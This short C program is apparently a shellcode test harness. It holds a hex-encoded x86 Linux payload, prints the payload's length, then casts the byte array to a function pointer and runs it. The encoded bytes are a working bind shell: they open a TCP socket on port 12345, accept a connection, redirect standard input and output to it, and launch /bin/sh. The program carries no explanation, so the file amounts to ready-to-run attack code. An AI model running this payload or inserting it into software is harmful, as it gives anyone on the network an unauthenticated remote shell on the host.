#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x89\xc3\xb0\x66\x6a\x06\x6a\x01\x6a\x02\xb3\x01\x89\xe1\xcd\x80\x89\xc7\x31\xc0\x50\x66\x68"
"\x30\x39"
"\x66\x6a\x02\x89\xe3\x6a\x10\x53\x57\x89\xc3\xb3\x02\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x6a\x01\x57\xb3\x04\x89\xe1\xcd\x80\x50\x50\xb0\x66\xb3\x05\x57\x89\xe1\xcd\x80\x89\xc6\x31\xc9\xb1\x02\xb0\x3f\x89\xf3\xcd\x80\x49\x79\xf7\x41\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
